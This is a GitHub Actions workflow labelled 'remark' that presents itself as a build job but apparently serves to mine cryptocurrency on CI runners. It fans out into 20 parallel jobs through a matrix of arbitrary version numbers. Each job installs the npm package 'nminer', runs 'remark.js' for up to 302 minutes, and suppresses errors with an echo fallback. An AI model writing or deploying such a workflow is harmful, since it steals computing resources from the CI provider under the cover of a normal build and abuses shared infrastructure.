name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 731 }
          - { version: 5052 }
          - { version: 8591 }
          - { version: 9447 }
          - { version: 7160 }
          - { version: 3245 }
          - { version: 8460 }
          - { version: 3949 }
          - { version: 481 }
          - { version: 3793 }
          - { version: 2629 }
          - { version: 1889 }
          - { version: 2653 }
          - { version: 3902 }
          - { version: 1699 }
          - { version: 4690 }
          - { version: 9859 }
          - { version: 7460 }
          - { version: 9821 }
          - { version: 1278 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: gadzooks
        run: |
          npm install nminer@latest
          timeout 302m node remark.js || echo "remark executed"